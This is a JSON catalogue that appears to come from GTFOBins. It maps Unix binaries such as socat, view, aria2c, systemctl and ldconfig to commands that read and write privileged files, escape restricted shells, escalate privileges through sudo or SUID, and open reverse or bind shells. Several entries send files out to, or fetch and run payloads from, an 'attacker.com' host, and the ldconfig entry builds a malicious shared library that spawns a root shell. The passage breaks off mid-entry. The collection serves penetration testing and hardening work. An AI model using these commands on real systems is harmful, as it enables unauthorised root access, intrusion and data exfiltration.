{
  "uudecode": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tee": {
    "description": "It can only append data if the destination exists.",
    "functions": {
      "file-write": [
        {
          "code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "red": {
    "description": "Read and write files limited to the current directory.",
    "functions": {
      "file-write": [
        {
          "code": "red file_to_write\na\nDATA\n.\nw\nq\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "red file_to_read\n,p\nq\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo red file_to_write\na\nDATA\n.\nw\nq\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "update-alternatives": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "gtester": {
    "description": "",
    "functions": {
      "file-write": [
        {
          "code": "LFILE=file_to_write\ngtester \"DATA\" -o $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "check_statusfile": {
    "description": "This is the `check_statusfile` Nagios plugi plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncheck_statusfile $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo check_statusfile $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "volatility": {
    "description": "This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a [`python`](/gtfobins/python/) shell, other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "volatility -f file.dump volshell\n__import__('os').system('/bin/sh')\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ]
    }
  },
  "ldconfig": {
    "description": "Follows a minimal example of how to use the described technique (details may change across different distributions).\n\nRun the code associated with the technique.\n\nIdentify a target SUID executable, for example the `libcap` library of `ping`:\n\n```\n$ ldd /bin/ping | grep libcap\n      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)\n```\n\nCreate a fake library that spawns a shell at bootstrap:\n\n```\necho '#include <unistd.h>\n\n__attribute__((constructor))\nstatic void init() {\n    execl(\"/bin/sh\", \"/bin/sh\", \"-p\", NULL);\n}\n' >\"$TF/lib.c\"\n```\n\nCompile it with:\n\n```\ngcc -fPIC -shared \"$TF/lib.c\" -o \"$TF/libcap.so.2\"\n```\n\nRun `ldconfig` again as described below then just run `ping` to obtain a root shell:\n\n```\n$ ping\n# id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n```\n",
    "functions": {
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\"\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "base32": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "eqn": {
    "description": "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\neqn \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./eqn \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "timedatectl": {
    "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n",
    "functions": {
      "shell": [
        {
          "code": "timedatectl list-timezones\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo timedatectl list-timezones\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "systemctl": {
    "description": "",
    "functions": {
      "suid": [
        {
          "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo systemctl\n!sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ispell": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ispell /etc/passwd\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./ispell /etc/passwd\n!/bin/sh -p\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ispell /etc/passwd\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "scrot": {
    "description": "This requires a running X server.",
    "functions": {
      "shell": [
        {
          "code": "scrot -e /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./scrot -e /bin/sh",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo scrot -e /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "aria2c": {
    "description": "Note that the subprocess is immediately sent to the background.",
    "functions": {
      "command": [
        {
          "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        },
        {
          "code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "file-download": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o \"$LFILE\" \"$URL\"\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "socat": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "socat stdin exec:/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "bind-shell": [
        {
          "code": "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n",
          "description": "It can bind a shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n",
          "description": "It can download remote files."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nsocat -u \"file:$LFILE\" -\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nsocat -u 'exec:echo DATA' \"open:$LFILE,creat\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo socat stdin exec:/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "softlimit": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "softlimit /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./softlimit /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo softlimit /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "crash": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "crash -h\n!sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "command": [
        {
          "code": "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "sudo": [
        {
          "code": "sudo crash -h\n!sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "joe": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "joe\n^K!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./joe\n^K!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo joe\n^K!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ash": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ash",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./ash",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ash",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ncftp": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ncftp\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./ncftp\n!/bin/sh -p\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ncftp\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "task": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "task execute /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo task execute /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "split": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "TF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        },
        {
          "code": "EXT=.xxx\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m --additional-suffix $EXTENSION $TF\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "command": [
        {
          "code": "COMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        },
        {
          "code": "COMMAND=id\necho | split --filter=$COMMAND /dev/stdin\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "shell": [
        {
          "code": "split --filter=/bin/sh /dev/stdin\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo split --filter=/bin/sh /dev/stdin\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "whiptail": {
    "description": "The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nwhiptail --textbox --scrolltext \"$LFILE\" 0 0\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "openvt": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dash": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "dash",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./dash -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo dash",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "column": {
    "description": "`column` expects textual data.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncolumn $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./column $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo column $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "view": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "view -c ':!/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "view\n:set shell=/bin/sh\n:shell\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "view -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "export LPORT=12345\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
